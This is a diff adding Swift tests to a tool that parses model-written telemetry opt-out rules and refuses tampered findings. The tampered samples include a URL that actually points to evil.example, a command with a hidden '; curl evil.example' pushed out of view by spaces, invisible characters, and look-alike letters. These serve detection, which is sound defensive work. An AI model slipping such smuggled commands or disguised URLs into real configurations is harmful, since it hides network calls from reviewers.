@@ -300,6 +300,14 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
         let quoted = #"A page says: {"telemetry": "forced", "summary": "From a page."}"#
         #expect(reasons("\(quoted)\n[\(answer(1, "a")), \(answer(2, "b"))]") == ["About a.", "About b."])
         #expect(try LLM.parseRule(from: "\(quoted)\nAnswer:\n[\(answer(1, "a"))]", itemID: "npm:a").summary == "About a.")
+        // Nor is a numbered list quoted on the way: the answer is the last one.
+        let page = #"A page shows: [{"entry": 1, "identifier": "npm:a", "telemetry": "forced", "summary": "From a page."}]"#
+        #expect(reasons("\(page)\n[\(answer(1, "a")), \(answer(2, "b"))]") == ["About a.", "About b."])
+        // The list inside an object, as some endpoints insist on, and a list with a note among its objects.
+        #expect(reasons("{\"answers\": [\(answer(1, "a")), \(answer(2, "b"))]}") == ["About a.", "About b."])
+        #expect(reasons("[\(answer(1, "a")), \"a note\", \(answer(2, "b"))]") == ["About a.", "About b."])
+        // A quote mark with a combining mark on it still ends its string.
+        #expect(reasons("[\(answer(1, "a").replacingOccurrences(of: "About a.\"", with: "About a.\"\u{301}")), \(answer(2, "b"))]\n[\(answer(1, "a")), \(answer(2, "b"))]") == ["About a.", "About b."])
         // A formula and a cask of one name are two items: the identifier carries the kind.
         let docker = { (entry: Int, id: String) in #"{"entry": \#(entry), "identifier": "\#(id)", "telemetry": "none", "summary": "s"}"# }
         #expect(LLM.parseRules(from: "[\(docker(1, "cask:docker")), \(docker(2, "brew:docker"))]", ids: ["brew:docker", "cask:docker"]).allSatisfy { (try? $0.get()) == nil })
@@ -586,6 +594,9 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
             (#""brew:x""#, #""x""#),                                  // id without a kind
             ("export X=0", "export X=0\\u202e"),                      // invisible character in the command
             (#""url": "https://example.com""#, #""url": "file:///etc/passwd""#),
+            (#""url": "https://example.com""#, #""url": "https://example.com@evil.example/""#),  // goes to another host than it reads
+            (#""sources": ["https://example.com"]"#, #""sources": ["http://example.com"]"#),
+            ("export X=0", "export X=0  ; curl evil.example"),        // spaces that push the end out of sight
             (#""sources": ["https://example.com"]"#, #""sources": []"#),
             (#""summary": "s""#, #""summary": "s", "disabledWhen": [{"json": "/Volumes/share/x.json", "key": "k", "equals": "v"}]"#),
         ] {
@@ -854,12 +865,15 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
         // Refused: what a review would not see. A zero-width space, a filler that counts as a letter, a line separator,
         // and a control character that JSON writes as an escape.
         (found.match, found.name, found.since) = (["brew:x"], "Example New Tool", nil)
-        for hidden in ["\u{200B}", "\u{3164}", "\u{2028}", "\u{7}"] {
+        for hidden in ["\u{200B}", "\u{3164}", "\u{2028}", "\u{7}", "\u{2800}", "\u{180B}"] {
             found.summary = "Seen\(hidden)unseen"
             #expect(try read(found) == "Refused: the summary holds invisible characters.\n")
         }
+        // Refused: a field long enough to push the rest off the screen.
+        (found.summary, found.name) = ("Usage events.", String(repeating: "n", count: 101))
+        #expect(try read(found) == "Refused: the name is longer than 100 characters.\n")
         // Refused: a look-alike letter in what is run, here a Cyrillic "е" in "echo".
-        found.summary = "Usage events."
+        found.name = "Example New Tool"
         found.optOut?.command = "\u{435}cho 1"
         #expect(try read(found) == "Refused: optOut.command is not plain ASCII text.\n")
         // Refused: a field no finding has, and a folder that a command would read as an option.
@@ -972,6 +986,13 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
         #expect { try Shell.run("/bin/sh", ["-c", "kill -KILL $$"], timeout: 10) } throws: { $0.localizedDescription == "sh was stopped by signal 9." }
     }
 
+    /// A program that has ended is not waited for because one it started still holds its output.
+    @Test func doesNotWaitForWhatAProgramLeftRunning() throws {
+        let started = Date()
+        #expect(try Shell.run("/bin/sh", ["-c", "sleep 20 & echo part"], timeout: 60) == Data("part\n".utf8))
+        #expect(Date().timeIntervalSince(started) < 15)
+    }
+
     /// A program that ignores the request to end is killed, and one that is stopped by the caller says so.
     @Test func endsAProgramThatWillNotStop() {
         // The program writes a file once it ignores the request, so the stop cannot come before that.
@@ -987,6 +1008,10 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
             (error as? Shell.Failure)?.output == Data("part\n".utf8) && error.localizedDescription == "sh was stopped."
         }
         #expect(Date().timeIntervalSince(asked) < 20)
+        // The same end for one that runs out of time.
+        let late = Date()
+        #expect { try Shell.run("/bin/sh", ["-c", "trap '' TERM; exec sleep 30"], timeout: 1) } throws: { $0.localizedDescription == "sh timed out after 1 s." }
+        #expect(Date().timeIntervalSince(late) < 20)
         // Asked to stop before it even started: ended as soon as it runs.
         let early = Shell.Stop()
         early.now()
